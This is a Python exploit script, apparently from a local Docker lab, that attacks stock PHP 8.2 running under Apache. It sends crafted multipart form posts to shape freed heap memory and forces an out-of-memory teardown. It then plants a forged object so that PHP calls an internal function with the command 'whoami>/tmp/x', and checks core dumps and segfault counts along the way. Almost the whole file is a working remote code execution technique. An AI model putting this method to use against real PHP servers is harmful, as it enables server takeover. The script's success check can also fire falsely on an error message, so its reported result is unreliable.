#!/usr/bin/env python3
"""oom119: HEAP-RESIDENT ARM — small values (mmap threshold bypass).

Tonight's synthesis (oom117/118): values-carried 1537B strings are
mmap'd (>128KB arenas) and munmap'd at teardown -> NEVER reused, NEVER
walked as zvals -> oom116/118 silences explained. The proven walk reads
REUSED heap memory, and the only reusable attacker memory is small
strings (names; rdi=0x7a7a414141414141 evidence). Names can't carry
NUL -> no legal object. BUT small VALUES (64B strings, heap-resident)
can: arm the heap with B,B cells (self-typing, legal bits), then the
final post's walked registry structures (bucket arrays) reuse that
freed memory -> window reads value=B ti=B.lo4 -> free_obj(B) -> chain.

Sequence per boot (one armed crash law):
  recreate(core ulimit) -> shape(98-era) -> probe arm post(names 0x02,
  values 64B marker) -> measure C0 -> B(legal bits, part13 256B value
  carries 184B block) -> ARM posts x3 (names 0x02, values 64B run,
  part13 = run+block) -> FIRE post (same shape; own OOM teardown walks
  armed heap) -> segv delta / core rdi / /tmp/x / probe.
Names 0x02x16 everywhere attacker-side: IS_NULL windows = quiet skip,
so stamp-'z' wild calls can't preempt the B dispatch.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
VMARK = b"QMARK7XY" * 3
MARK_CELL = VMARK[:16]
SKIP = b"\x02" * 16
STRIDE = 3584
PART = 13
BLK = 0xB8
K1 = 4200
SMALL = 4          # 64B values = 4x16B cells (heap, not mmap)
BIGPART_VAL = 16   # part 13 value = 256B = run + block


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def probe_scan(needle, chunk=262144, maxc=8):
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d"
                        % (HOST, needle.hex(), chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out \
                and out.strip() not in ("bad", "ERR open"):
            offs = []
            for line in out.splitlines():
                line = line.strip()
                if not line.startswith("R="):
                    continue
                m = re.search(r"d=((?:0x)?[0-9a-f]+(?: (?:0x)?[0-9a-f]+)*)", line)
                if m:
                    for tok in m.group(1).split():
                        v = int(tok, 16)
                        if v > 0x10000:
                            offs.append(v)
            if offs:
                return offs
        time.sleep(0.7)
    return []


def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()


def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))


def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False


def post_mod(body, timeout=240):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def decode_core(tag):
    host_copy = "/tmp/core119_%s" % tag
    c1 = subprocess.run(["docker", "cp", "php_vuln:/tmp/core", host_copy], capture_output=True)
    if c1.returncode != 0:
        return None
    subprocess.run(["docker", "cp", host_copy, "phpbuild:/tmp/core.119_%s" % tag], capture_output=True)
    open("/tmp/g119.gdb", "w").write("set pagination off\nset confirm off\nbt 3\ninfo registers rdi rip\nquit\n")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g119.gdb /tmp/libphp.stock.so /tmp/core.119_%s 2>&1 | grep -E '^rdi|^rip' " % tag],
                       capture_output=True, timeout=120)
    m = re.search(r"rdi\s+(0x[0-9a-f]+)", r.stdout.decode("latin1"))
    return m.group(1) if m else "?"


def cell_of(addr):
    return struct.pack("<Q", addr) * 2


def small_part(i, value16):
    """Custom part: names all-skip 0x02, small heap-resident values."""
    val = value16 * SMALL
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="'
            + SKIP * 190 + b"%d" % i + b'[x]"\r\n\r\n')
    return head + val + b"\r\n"


def block_part(i, B, OFF):
    """Part 13: 256B value = B,B run up to OFF, 184B block, run on."""
    t = bytearray(cell_of(B) * BIGPART_VAL)
    st = struct.pack_into
    st("<II", t, OFF + 0x00, 1, 0x108)
    st("<II", t, OFF + 0x08, 1, 0)
    st("<Q", t, OFF + 0x10, 0)
    st("<Q", t, OFF + 0x18, B + 0x68)
    st("<I", t, OFF + 0x2C, 1)
    st("<Q", t, OFF + 0x50, B + 0x90)
    t[OFF + 0x58] = 6
    st("<I", t, OFF + 0x5C, 0x106)
    st("<Q", t, OFF + 0x68, 0)
    st("<Q", t, OFF + 0x70, BASE + ZIF)
    st("<IIQI", t, OFF + 0x90, 1, 0x106, 0, len(CMD))
    t[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    return small_part(i, bytes(t))


def build_custom(block_tile=None):
    """Names 0x02-skip; values 64B heap-resident; poison parts P.PREP."""
    ps = []
    for i in range(K1):
        if block_tile is not None and i == PART:
            ps.append(block_part(i, *block_tile))
        else:
            ps.append(small_part(i, cell_of(B)))
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


print("=== oom119: heap-resident arm (small values bypass mmap law) ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
print("md5=%s corelim=%s" % (md5[:8], sh("cat /proc/1/limits | grep -i 'core file'").split()[3]), flush=True)
assert md5 == STOCK_MD5, "not stock"

# ---- shape: 98-era ----
n0 = segv_count()
for k1 in P.K1S[:-1]:
    c, _r = post_mod(P.build_attack(k1, 5000000))
    print("warm k1=%d: %s" % (k1, c), flush=True)
print("shape segv delta=%d" % (segv_count() - n0), flush=True)

BASE = base_now()
print("base=0x%x" % BASE, flush=True)

# ---- probe arm: marker post (small values) -> C0 ----
def marker_body():
    ps = []
    for i in range(K1):
        ps.append(small_part(i, MARK_CELL if i == 20 else cell_of(0x414141414141)))
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

c, _r = post_mod(marker_body())
print("marker post: %s" % c, flush=True)
offs = probe_scan(VMARK)
if not offs:
    c, _r = post_mod(marker_body())
    print("marker retry: %s" % c, flush=True)
    offs = probe_scan(VMARK)
assert offs, "marker not found"
C0 = offs[0]
print("C0=0x%x strides=%s" % (C0, [hex(o - C0) for o in offs[1:4]]), flush=True)

# ---- B: legal address inside part 13's small-value string ----
VSTART = C0 + STRIDE * PART
B = OFF = None
for off in range(0x10, SMALL * 16 - BLK - 1):
    cand = VSTART + off
    if cand & 0xF != 8 or (cand >> 8) & 1 != 1 or (cand >> 9) & 1 != 0:
        continue
    nb = cand.to_bytes(6, "little")
    if any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
        continue
    B, OFF = cand, off
    break
assert B, "no legal B in 64B value window"
print("B=0x%x (part %d +0x%x) nib8=%d bit8=%d bit9=%d"
      % (B, PART, OFF, B & 0xF, (B >> 8) & 1, (B >> 9) & 1), flush=True)

# ---- ARM x3 then FIRE ----
abody = build_custom(block_tile=(B, OFF))
print("arm/fire body %.2f MB" % (len(abody) / 1048576.0), flush=True)
for rep in range(3):
    n0 = segv_count()
    c, r = post_mod(abody)
    time.sleep(2)
    d = segv_count() - n0
    core = sh("test -f /tmp/core && echo y") == "y"
    xf = sh("cat /tmp/x 2>&1")
    print("fire%d: %s (%.0fs) segv+%d core=%s x=%s rdi=%s"
          % (rep, c, 0.0, d, core, xf[:40],
             decode_core("f%d" % rep) if core else "-"), flush=True)
    if "/tmp/x" in xf:
        print("!!! /tmp/x EXISTS - CAMPAIGN WON", flush=True)
        break
    if core:
        sh("mv /tmp/core /tmp/core.used 2>/dev/null")
    if d == 0 and rep == 1:
        # probe: did the arm memory survive (marker still readable)?
        offs2 = probe_scan(VMARK)
        print("post-fire marker probe: %s" % (["0x%x" % o for o in offs2[:3]] or "GONE"), flush=True)

print("=== done ===", flush=True)
